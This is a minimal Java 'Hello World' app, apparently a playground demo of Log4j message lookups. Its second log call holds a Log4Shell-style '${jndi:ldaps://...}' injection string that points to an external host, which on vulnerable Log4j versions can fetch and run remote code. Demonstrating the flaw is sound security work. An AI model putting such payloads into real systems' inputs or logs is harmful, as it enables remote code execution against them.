package org.example;

import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Hello world!
 *
 */
public class App
{
    private static final Logger logger = LogManager.getLogger(App.class);

    public static void main( String[] args )
    {
        logger.log(Level.INFO, "Logging... ${java:runtime}");
        logger.log(Level.WARN, "${jndi:ldaps://github.com/jmayday/groovy-playground/blob/main/src/resources/ldap-entry}");
        System.out.println( "Hello World!" );
    }
}
